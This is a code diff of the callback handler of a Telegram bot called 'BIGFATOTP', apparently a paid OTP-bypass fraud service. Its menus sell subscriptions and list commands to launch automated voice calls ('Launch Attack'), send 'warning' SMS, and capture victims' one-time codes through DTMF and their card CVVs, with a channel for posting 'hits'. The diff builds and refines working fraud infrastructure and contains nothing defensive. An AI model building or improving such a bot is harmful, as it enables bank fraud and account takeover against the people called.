@@ -4,18 +4,17 @@ from config import bot, ADMIN_IDS
 from database import get_connection, check_subscription
 from handlers.keys import process_key_step
 from handlers.payments import create_hoodpay_payment
-# Importamos para redirigir
-from handlers.profile import show_profile, show_referral
+# IMPORTAR LA NUEVA LÓGICA Y REFERRAL
+from handlers.profile import get_profile_content, show_referral
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     user_id = call.from_user.id
     
     # ==========================================
-    # 🔙 LÓGICA DE VOLVER AL INICIO (HOME)
+    # 🔙 BACK TO HOME
     # ==========================================
     if call.data == "back_home":
-        # Reconstruimos el Menú Principal
         text = f"BIGFATOTP - 𝙊𝙏𝙋 𝘽𝙊𝙏\nHello, {call.from_user.first_name}!\n\nSelect an option below:"
         
         markup = InlineKeyboardMarkup(row_width=2)
@@ -29,23 +28,29 @@ def callback_query(call):
             InlineKeyboardButton("👥 Referral", callback_data="referral"),
             InlineKeyboardButton("⛑️ Support", callback_data="support")
         )
-        # Botón de Admin solo si es admin
         if user_id in ADMIN_IDS:
             markup.add(InlineKeyboardButton("🕴️ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟", callback_data="admin_panel"))
             
-        # Editamos el mensaje actual para volver al menú
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
 
     # ==========================================
-    # 👤 PERFIL Y REFERIDOS
+    # 👤 PERFIL (CORREGIDO)
     # ==========================================
     elif call.data == "show_profile":
-        # Borramos el mensaje anterior y lanzamos el perfil (que ya tiene botón Back)
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-        show_profile(call.message)
+        # Usamos la función lógica pasándole el ID del usuario del botón
+        text, markup = get_profile_content(user_id, call.from_user.first_name)
+        
+        if text:
+            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+        else:
+            bot.answer_callback_query(call.id, "⚠️ Profile not found. Type /start", show_alert=True)
 
     elif call.data == "referral":
+        # Para referral, como show_referral espera un 'message', lo más fácil es borrar y reenviar
+        # o adaptar show_referral. Por ahora, borramos y enviamos nuevo.
         bot.delete_message(call.message.chat.id, call.message.message_id)
+        # Creamos un objeto mensaje falso para reutilizar la funcion
+        call.message.from_user = call.from_user
         show_referral(call.message)
 
     elif call.data == "bot_status":
@@ -59,14 +64,12 @@ def callback_query(call):
             markup = InlineKeyboardMarkup()
             markup.row(InlineKeyboardButton("🔑 1 Day", callback_data="gen_1"), InlineKeyboardButton("🔑 1 Week", callback_data="gen_7"))
             markup.row(InlineKeyboardButton("📜 Logs", callback_data="show_log"), InlineKeyboardButton("ℹ️ Version", callback_data="show_version"))
-            # 🔙 BOTÓN BACK
             markup.add(InlineKeyboardButton("⬅ Back to Menu", callback_data="back_home"))
-            
-            bot.edit_message_text("🕴️ **ADMIN DASHBOARD**\nSelect an action:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+            bot.edit_message_text("🕴️ **ADMIN DASHBOARD**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
         else:
             bot.answer_callback_query(call.id, "⛔ Access Denied")
 
-    # GENERACIÓN DE KEYS (ADMIN)
+    # GENERAR KEYS
     elif call.data.startswith("gen_"):
         if user_id not in ADMIN_IDS: return
         days = int(call.data.split("_")[1])
@@ -77,20 +80,16 @@ def callback_query(call):
         conn.commit()
         conn.close()
         
-        # Al generar key, mostramos mensaje y botón para volver
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("⬅ Back to Admin", callback_data="admin_panel"))
         
         bot.edit_message_text(
-            f"✅ **Key Generated Successfully!**\n\n🔑 Code: `{new_key}`\n⏳ Duration: {days} Days", 
-            call.message.chat.id, 
-            call.message.message_id,
-            reply_markup=markup,
-            parse_mode="Markdown"
+            f"✅ **Key Created!**\nCode: `{new_key}`\nDays: {days}", 
+            call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown"
         )
 
     # ==========================================
-    # ℹ️ MENÚS DE INFORMACIÓN
+    # ℹ️ INFO MENUS
     # ==========================================
     elif call.data == "commands":
         text = """
@@ -99,51 +98,44 @@ def callback_query(call):
 👤 **User:**
 `/start` - Main Menu
 `/profile` - Subscription Info
-`/call [number] [service]` - Launch Attack
-`/setscript` - Create Custom Script
-`/myscripts` - Manage Scripts
+`/call [number] [service]` - OTP Call
+`/sms [number] [service]` - Warning SMS
+`/cvv [number] [bank]` - CVV Mode
+`/setscript` - Custom Voice
 `/clean` - Delete History
 
 👮‍♂️ **Admin:**
-`/create [days]` - Generate Key Manual
-`/admin` - Quick Check
+`/create [days]` - Generate Key
         """
         markup = InlineKeyboardMarkup()
-        # 🔙 BOTÓN BACK
         markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
     
     elif call.data == "features":
-        text = "🛠️ **FEATURES**\n\n• **Neural Voice:** Native accents (US, MX, ES, BR).\n• **DTMF Capture:** Instant code logging.\n• **Scripts:** Custom scenarios database.\n• **Payments:** Crypto automated."
+        text = "🛠️ **FEATURES**\n\n• **Neural Voice:** Native accents.\n• **DTMF Capture:** Instant logging.\n• **Live Feeds:** Public hits channel.\n• **SMS:** Warmup messages.\n• **CVV Mode:** Capture 3 digits."
         markup = InlineKeyboardMarkup()
-        # 🔙 BOTÓN BACK
         markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
     elif call.data == "community":
-        text = "🫂 **COMMUNITY**\n\nJoin our official channel for updates, scripts, and support:\n\n👉 @YourChannelHere"
+        text = "🫂 **COMMUNITY**\n\nJoin our official channel:\n👉 @YourChannelHere"
         markup = InlineKeyboardMarkup()
-        # 🔙 BOTÓN BACK
         markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
     elif call.data == "support":
-        text = "⛑️ **SUPPORT**\n\nNeed help with a payment or setup?\n\nContact: @MatthewOwner\n_Response time: 2-4 hours_"
+        text = "⛑️ **SUPPORT**\n\nContact: @MatthewOwner"
         markup = InlineKeyboardMarkup()
-        # 🔙 BOTÓN BACK
         markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
         bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
     # ==========================================
-    # 💳 PAGOS Y KEYS
+    # 💳 PAYMENTS & KEYS
     # ==========================================
     elif call.data == "enter_key":
-        # Aquí no podemos poner botón "Atrás" fácil porque es un input de texto,
-        # pero podemos poner un botón de cancelar.
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("❌ Cancel / Back", callback_data="back_home"))
-        
-        msg = bot.send_message(call.message.chat.id, "🎟️ **REDEEM LICENSE**\n\nPlease paste your Key below (e.g., `KEY-XXXX`):", reply_markup=markup, parse_mode="Markdown")
+        markup.add(InlineKeyboardButton("❌ Cancel", callback_data="back_home"))
+        msg = bot.send_message(call.message.chat.id, "🎟️ **Send your Key:**", reply_markup=markup)
         bot.register_next_step_handler(msg, process_key_step)
 
     elif call.data == "buy_subs":
@@ -151,10 +143,8 @@ def callback_query(call):
         markup.add(InlineKeyboardButton("📅 1 Day ($50)", callback_data="pay_daily"))
         markup.add(InlineKeyboardButton("🗓 1 Week ($150)", callback_data="pay_weekly"))
         markup.add(InlineKeyboardButton("📆 1 Month ($285)", callback_data="pay_monthly"))
-        # 🔙 BOTÓN BACK
         markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
-        
-        bot.edit_message_text("💳 **SELECT SUBSCRIPTION PLAN**\n\nChoose your license duration. Activation is automatic.", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+        bot.edit_message_text("💳 **Select Plan:**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
     elif call.data in ["pay_daily", "pay_weekly", "pay_monthly", "pay_dev_test"]:
         plan = call.data.split("_")[1]
